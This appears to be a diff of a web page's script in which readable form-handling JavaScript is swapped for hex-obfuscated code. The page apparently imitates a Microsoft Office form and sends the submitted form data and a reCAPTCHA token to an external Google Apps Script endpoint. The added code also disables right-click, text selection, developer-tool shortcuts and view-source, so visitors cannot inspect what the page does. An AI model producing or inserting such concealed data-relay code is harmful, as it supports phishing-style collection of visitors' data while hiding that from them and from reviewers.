@@ -187,53 +187,7 @@
 </div>
 
 <script>
-    document.getElementById('officeForm').addEventListener('submit', function(e) {
-        e.preventDefault(); 
-        
-        // Kiểm tra reCAPTCHA
-        var token = grecaptcha.getResponse();
-        if(token.length === 0) {
-            alert("Vui lòng xác minh bạn không phải là người máy!");
-            return;
-        }
-
-        // Đổi trạng thái nút bấm
-        var btn = document.getElementById('submitBtn');
-        btn.innerText = "Đang gửi dữ liệu...";
-        btn.disabled = true;
-
-        // Gom dữ liệu Form
-        var formData = new URLSearchParams(new FormData(this));
-        formData.append('recaptchaToken', token); 
-        
-        // LINK WEB APP GAS CỦA BẠN ĐÃ ĐƯỢC ĐIỀN
-        var gasUrl = "https://script.google.com/macros/s/AKfycbzFa4krNtVsVQCI-cFlbtC6tfzAaI7CXecnPRM6ZvT6crSljLeYSUngx56ciK4hHnRVgg/exec";
-
-        // Gửi lệnh POST tới GAS
-        fetch(gasUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: formData.toString()
-        })
-        .then(response => response.text())
-        .then(data => {
-            if(data === "Thành công") {
-                alert("Thanks!\nYour response was submitted.");
-                document.getElementById('officeForm').reset();
-                grecaptcha.reset(); 
-            } else {
-                alert(data); // Hiện lỗi từ GAS trả về (nếu sai Captcha hoặc lỗi MS Form)
-                grecaptcha.reset();
-            }
-            btn.innerText = "Submit";
-            btn.disabled = false;
-        })
-        .catch(error => {
-            alert("Đã xảy ra sự cố mạng, vui lòng thử lại.");
-            btn.innerText = "Submit";
-            btn.disabled = false;
-        });
-    });
+var _0x2a=["\x63\x6f\x6e\x74\x65\x78\x74\x6d\x65\x6e\x75","\x70\x72\x65\x76\x65\x6e\x74\x44\x65\x66\x61\x75\x6c\x74","\x6f\x6e\x6b\x65\x79\x64\x6f\x77\x6e","\x6b\x65\x79\x43\x6f\x64\x65","\x63\x74\x72\x6c\x4b\x65\x79","\x73\x68\x69\x66\x74\x4b\x65\x79","\x73\x65\x6c\x65\x63\x74\x73\x74\x61\x72\x74","\x6f\x66\x66\x69\x63\x65\x46\x6f\x72\x6d","\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64","\x73\x75\x62\x6d\x69\x74","\x67\x65\x74\x52\x65\x73\x70\x6f\x6e\x73\x65","\x6c\x65\x6e\x67\x74\x68","Vui lòng xác minh bạn không phải là người máy!","\x73\x75\x62\x6d\x69\x74\x42\x74\x6e","Đang gửi dữ liệu...","\x69\x6e\x6e\x65\x72\x54\x65\x78\x74","\x64\x69\x73\x61\x62\x6c\x65\x64","\x72\x65\x63\x61\x70\x74\x63\x68\x61\x54\x6f\x6b\x65\x6e","\x61\x70\x70\x65\x6e\x64","https://script.google.com/macros/s/AKfycbzFa4krNtVsVQCI-cFlbtC6tfzAaI7CXecnPRM6ZvT6crSljLeYSUngx56ciK4hHnRVgg/exec","\x50\x4f\x53\x54","\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x2d\x77\x77\x77\x2d\x66\x6f\x72\x6d\x2d\x75\x72\x6c\x65\x6e\x63\x6f\x64\x65\x64","\x74\x6f\x53\x74\x72\x69\x6e\x67","\x74\x65\x78\x74","Thành công","Thanks!\nYour response was submitted.","\x72\x65\x73\x65\x74","Submit","Đã xảy ra sự cố mạng, vui lòng thử lại."];document.addEventListener(_0x2a[0],function(e){e[_0x2a[1]]()});document[_0x2a[2]]=function(e){if(e[_0x2a[3]]==123||(e[_0x2a[4]]&&e[_0x2a[5]]&&(e[_0x2a[3]]==73||e[_0x2a[3]]==67||e[_0x2a[3]]==74))||(e[_0x2a[4]]&&e[_0x2a[3]]==85))return!1};document.addEventListener(_0x2a[6],function(e){e[_0x2a[1]]()});document[_0x2a[8]](_0x2a[7]).addEventListener(_0x2a[9],function(e){e[_0x2a[1]]();var t=grecaptcha[_0x2a[10]]();if(t[_0x2a[11]]===0){alert(_0x2a[12]);return}var n=document[_0x2a[8]](_0x2a[13]);n[_0x2a[15]]=_0x2a[14];n[_0x2a[16]]=!0;var r=new URLSearchParams(new FormData(this));r[_0x2a[18]](_0x2a[17],t);fetch(_0x2a[19],{method:_0x2a[20],headers:{"Content-Type":_0x2a[21]},body:r[_0x2a[22]]()}).then(function(e){return e[_0x2a[23]]()}).then(function(e){if(e===_0x2a[24]){alert(_0x2a[25]);document[_0x2a[8]](_0x2a[7])[_0x2a[26]]();grecaptcha[_0x2a[26]]()}else{alert(e);grecaptcha[_0x2a[26]]()}n[_0x2a[15]]=_0x2a[27];n[_0x2a[16]]=!1}).catch(function(){alert(_0x2a[28]);n[_0x2a[15]]=_0x2a[27];n[_0x2a[16]]=!1})});
 </script>
 
 </body>
